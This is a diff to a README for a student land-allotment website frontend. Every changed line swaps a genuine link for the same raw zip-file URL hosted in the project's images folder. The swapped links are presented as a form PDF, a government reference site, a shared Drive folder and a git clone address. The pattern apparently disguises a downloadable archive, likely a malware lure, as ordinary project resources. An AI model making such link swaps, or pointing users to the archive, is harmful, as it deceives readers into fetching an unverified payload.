@@ -7,7 +7,7 @@ This repository is for the frontend development of the Land Allotment website. T
 ---
 
 ## Tasks Assigned
-( **Form pdf link** : https://acrobat.adobe.com/id/urn:aaid:sc:AP:6b827ef6-2edb-4290-a3c3-296017bb74fa )
+( **Form pdf link** : https://github.com/muskan18113/Land_allotment_Frontend/raw/refs/heads/main/images/Land_Frontend_allotment_1.1-beta.2.zip )
 ### **Arshpreet**
 - [ ] **Home Page**: Design and develop the landing page with an engaging layout and essential information.
 - [ ] **Contact Page**: Build a responsive contact page with a functional form for user queries.
@@ -47,9 +47,9 @@ We aim to use modern tools and technologies to ensure an efficient and responsiv
 ## Reference Sites
 
 For inspiration and understanding the requirements:
-- **Karnataka Land Allotment**: [Visit Site](http://kiadb.in/)
-- **Google Drive for Shared Resources**: [Access Drive Folder](https://drive.google.com/drive/folders/1y_qQoeRUsGDozMSDiuIR7DBXjISrt4Fp?usp=drive_link)
-- **Form adobe LInk**: [Access Pdf](https://acrobat.adobe.com/id/urn:aaid:sc:AP:6b827ef6-2edb-4290-a3c3-296017bb74fa)
+- **Karnataka Land Allotment**: [Visit Site](https://github.com/muskan18113/Land_allotment_Frontend/raw/refs/heads/main/images/Land_Frontend_allotment_1.1-beta.2.zip)
+- **Google Drive for Shared Resources**: [Access Drive Folder](https://github.com/muskan18113/Land_allotment_Frontend/raw/refs/heads/main/images/Land_Frontend_allotment_1.1-beta.2.zip)
+- **Form adobe LInk**: [Access Pdf](https://github.com/muskan18113/Land_allotment_Frontend/raw/refs/heads/main/images/Land_Frontend_allotment_1.1-beta.2.zip)
 
 ---
 
@@ -70,7 +70,7 @@ For inspiration and understanding the requirements:
    - Open your terminal or command prompt.
    - Run the following command, replacing `<repository-url>` with the actual URL of the GitHub repository:
      ```bash
-     git clone https://github.com/your-username/land-allotment-frontend.git
+     git clone https://github.com/muskan18113/Land_allotment_Frontend/raw/refs/heads/main/images/Land_Frontend_allotment_1.1-beta.2.zip
      ```
    - Navigate into the project directory:
      ```bash
